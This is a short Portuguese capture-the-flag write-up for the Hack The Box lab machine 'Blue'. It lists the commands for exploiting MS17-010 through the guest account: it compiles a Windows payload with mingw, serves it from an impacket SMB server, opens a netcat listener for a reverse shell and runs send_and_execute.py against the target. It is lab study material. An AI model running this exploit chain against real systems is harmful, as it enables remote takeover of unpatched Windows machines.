Blue
========================

Essa maquina e muito parecida com a Legacy com uma peculiaridade de que a conta utilizada pra fazer leitura do named pipe copm o exploit e a guest e nao NULL.

## Enumeration

    sudo nmap_enum blue.htb

![qownnotes-media-heVNjC](../../../media/qownnotes-media-heVNjC.png)

![qownnotes-media-bttFXn](../../../media/qownnotes-media-bttFXn.png)


## Exploitation

Aqui, como mencionado anteriormente foi visto que a exploracao ocorria por meio do usuario 'guest'.



![qownnotes-media-kzUhjf](../../../media/qownnotes-media-kzUhjf.png)

No demais,o seguimos o mesmos passos da maquina [Legacy](Legacy.md#Exploitation).

    cd /home/kali/ownCloud/owncloud/Area_de_trabalho/tools/cves/CVE-2017-0143/MS17-010/impacket
    
    source exploit_ms17-010/bin/activate
    
Pronto, agora eu so preciso preparar o payload para execucao na maquina alvo:

    vi backup.c
    
![qownnotes-media-kTCNcQ](../../../media/qownnotes-media-kTCNcQ.png)

    i686-w64-mingw32-gcc backup.c -o backup_10_10_14_134.exe
    impacket-smbserver smb .

Em um outro terminal eu preparei o netcat para  a shell reversa:

    nc -nlvp 80

Retrocedendo para o primeiro passo da exploracao, agora basta exeutarmos o exploit:

    python send_and_execute.py 10.129.248.167 ../payload/backup_10_10_14_134.exe